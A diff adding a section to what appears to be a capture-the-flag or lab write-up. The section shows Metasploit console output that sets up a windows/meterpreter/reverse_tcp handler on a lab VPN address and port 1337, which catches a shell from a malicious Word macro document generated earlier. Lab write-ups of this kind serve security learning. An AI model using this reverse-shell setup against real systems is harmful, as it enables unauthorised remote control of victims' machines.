@@ -197,5 +197,41 @@ msf exploit(multi/fileformat/office_word_macro) > run
 I started by using metasploit to create the file, then throwing my IP and port of choice
 
 ```python
+msf exploit(multi/fileformat/office_word_macro) > use exploit/multi/handler 
+[*] Using configured payload generic/shell_reverse_tcp
+msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf exploit(multi/handler) > options
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(multi/handler) > set lhost tun0
+lhost => 10.10.14.61
+msf exploit(multi/handler) > set lport 1337
+lport => 1337
+msf exploit(multi/handler) > run
+[*] Started reverse TCP handler on 10.10.14.61:1337 
+```
+
+Ill then set the listener, ill make sure to set the same payload as i did in the file generation, then simply add my IP and port in again
+
+```python
 
 ```
